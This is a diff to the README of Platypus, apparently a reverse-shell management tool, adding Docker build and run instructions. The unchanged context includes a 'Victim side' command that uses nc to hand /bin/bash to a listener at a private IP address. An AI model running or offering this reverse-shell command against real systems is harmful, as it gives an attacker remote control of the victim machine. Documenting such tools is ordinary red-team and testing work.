@@ -39,6 +39,18 @@ chmod +x ./Platypus_linux_amd64
 ./Platypus_linux_amd64
 ```
 
+#### Run Platypus from docker
+```
+// Build your docker image
+docker build -t xxxx/Platypus .
+
+// Use host network mode to run container
+docker run --net=host -it xxxx/Platypus
+
+// Don' t use host network, and you need to specify the port manually
+docker run -p 8000:8000 -p 9000:9000 xxxx/Platypus
+```
+
 #### Victim side
 ```
 nc -e /bin/bash 192.168.1.2 8080
